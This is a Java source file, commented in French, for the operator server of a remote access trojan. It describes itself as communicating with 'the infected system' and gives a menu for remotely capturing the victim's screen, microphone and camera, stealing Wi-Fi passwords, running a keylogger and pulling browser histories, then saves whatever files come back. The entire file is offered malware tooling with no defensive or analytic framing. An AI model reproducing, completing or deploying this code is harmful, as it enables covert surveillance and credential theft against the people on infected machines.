package main;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Scanner;

/**
 * Créer un serveur pour permettre la communication entre le système infecté.
 */
public class Server {

	ObjectInputStream ois;
	ObjectOutputStream oos;
	Scanner input;
	final String location = "C:\\Users\\Benoit\\Desktop\\";
	String locationTemp;
	static String[] fonctions;

	// Port du serveur
	static int port = 8031;
	static final int BUFFER_SIZE = 100;

	// Socket utilisé sur le serveur
	ServerSocket serverSocket;

	/**
	 * Débute le fonctionnement du serveur. C'est la fonction principale.
	 * 
	 * @param arg
	 *            Arguments de ligne de commandes.
	 */
	public static void main(String[] arg) {
		fonctions = new String[15];
		fonctions[0] = "Capturer d'écran";
		fonctions[1] = "Capturer un enregistrement de microphone";
		fonctions[2] = "Capturer de caméra";
		fonctions[3] = "Recevoir les addresses IP du système";
		fonctions[4] = "Recevoir de l'information du système";
		fonctions[5] = "Recevoir de l'information sur la localisation du système";
		fonctions[6] = "Recevoir les mots de passes des réseaux sans-fils";
		fonctions[7] = "Recevoir une liste de programmes";
		fonctions[8] = "Activer l'enregistreur de frappes";
		fonctions[9] = "Recevoir le fichier de frappes";
		fonctions[10] = "Arrêter l'enregistreur de frappes";
		fonctions[11] = "Recevoir l'historique de Google Chrome";
		fonctions[12] = "Recevoir l'historique de Mozilla Firefox";
		fonctions[13] = "Recevoir l'historique d'Opera";
		fonctions[14] = "Déconnecter du serveur";

		printAide();
		
		new Server();
	}

	/**
	 * Constructeur du serveur.
	 */
	public Server() {

		// Créer le socket du serveur et attend une connection
		try {
			serverSocket = new ServerSocket(port);

			while (true) {
				// Accepte la connection du client
				Socket socket = serverSocket.accept();
				
				// Créer un 'thread'
				TcpThread t = new TcpThread(socket);
				t.start();
			}
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	/**
	 * Enregistre le fichier.
	 * 
	 * @param socket
	 *            Le 'socket' utilisé pour recevoir le fichier.
	 */
	public void saveFile(Socket socket) {
		try {
			FileOutputStream fos = null;
			byte[] buffer = new byte[BUFFER_SIZE];

			// Lit le nom du fichier
			Object o = ois.readObject();

			// Détermine l'endroit du fichier
			locationTemp = location + String.valueOf(o);

			if (o instanceof String) {
				fos = new FileOutputStream(new File(locationTemp));
			} else {
				exception("Erreur");
			}

			// Lit le fichier
			Integer bytesRead = 0;

			do {
				o = ois.readObject();
				if (!(o instanceof Integer)) {
					exception("Erreur");
				}

				bytesRead = (Integer) o;

				o = ois.readObject();
				if (!(o instanceof byte[])) {
					exception("Erreur");
				}

				// Écrit au fichier
				buffer = (byte[]) o;
				fos.write(buffer, 0, bytesRead);

			} while (bytesRead == BUFFER_SIZE);

			fos.close();
			ois.close();
			oos.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	/**
	 * Fonction pour faire apparaitre une exception.
	 * 
	 * @param message
	 *            Le message dans l'exception.
	 */
	public static void exception(String message) {
		try {
			throw new Exception(message);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	/**
	 * Imprime les commandes possibles.
	 */
	public static void printAide(){
		System.out.println("Les commandes possibles :");
		for (int i = 0; i < fonctions.length; i++) {
			System.out.printf("\t" + (i + 1) + " - " + fonctions[i] + "\n");
		}
	}

	/**
	 * Fonction pour créer un 'thread'.
	 */
	public class TcpThread extends Thread {

		// Le 'socket' utilisé pour communiquer.
		Socket socket;

		/**
		 * Constructeur de la fonction de 'thread'.
		 * 
		 * @param socket
		 *            Le 'socket' utilisé pour communiquer.
		 */
		public TcpThread(Socket socket) {
			this.socket = socket;
		}
		
		// Commencement de la fonction 'thread'
		public void run() {
			try {

				// Création d'entrée/sortie pour communiquer
				oos = new ObjectOutputStream(socket.getOutputStream());
				oos.flush();
				ois = new ObjectInputStream(socket.getInputStream());

				// La décision du serveur
				String choix = null;
				int current = 0;

				while (current < 1 || current > 15) {
					System.out.println("Entrer un choix, pour connaître les choix, tapez \'h\'");
					input = new Scanner(System.in);
					System.out.print(">> ");
					choix = input.nextLine();
					
					if (choix.equals("h")) {
						printAide();
					}

					try {
						current = Integer.parseInt(choix);
					} catch (NumberFormatException e) {
					}
				}

				// Envoie le choix au client
				oos.writeObject(current);
				oos.flush();

				// Appel la fonction pour enregistrer le fichier
				if (current != 15) {
					saveFile(socket);
				}

				// Arrêt le serveur
				if (current == 15) {
					System.exit(0);
				}
			} catch (IOException e) {
				e.printStackTrace();
				return;
			} catch (Exception e) {
				e.printStackTrace();
				return;
			} finally {
				try {
					oos.close();
					ois.close();
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}
	}

	/**
	 * Fonction utilisé pour trouver un port d'ouvert.
	 * 
	 * @return Le numéro d'un port ouvert.
	 */
	public static int findFreePort() {
		ServerSocket socket = null;
		try {
			socket = new ServerSocket(0);
			socket.setReuseAddress(true);
			int port = socket.getLocalPort();
			try {
				socket.close();
			} catch (IOException e) {
			}
			return port;
		} catch (IOException e) {
		} finally {
			if (socket != null) {
				try {
					socket.close();
				} catch (IOException e) {
				}
			}
		}
		throw new IllegalStateException("Could not find a free TCP/IP port to start embedded Jetty HTTP Server on");
	}
}
